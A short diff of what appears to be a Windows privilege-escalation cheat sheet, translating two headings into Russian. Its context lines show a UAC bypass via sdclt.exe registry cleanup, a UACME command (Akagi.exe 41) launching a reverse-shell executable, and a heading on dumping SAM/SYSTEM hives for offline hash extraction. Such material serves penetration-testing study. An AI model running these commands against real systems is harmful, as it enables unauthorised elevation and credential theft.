@@ -296,7 +296,7 @@ sdclt.exe
 reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe /f
 ```
 
-UACME automated UAC bypass — 70+ techniques, method 41 for modern Windows
+UACME — автоматизированный обход UAC, более 70 техник, метод 41 для современных версий Windows.
 
 ```
 # UACME — automated bypass tool:
@@ -305,7 +305,7 @@ UACME automated UAC bypass — 70+ techniques, method 41 for modern Windows
 Akagi.exe 41 C:\Temp\reverse.exe
 ```
 
-Dump SAM/SYSTEM hive for offline hash extraction
+Дамп кустов SAM/SYSTEM для офлайн-извлечения хэшей.
 
 ```
 # SAM/SYSTEM dump (requires SYSTEM or admin):
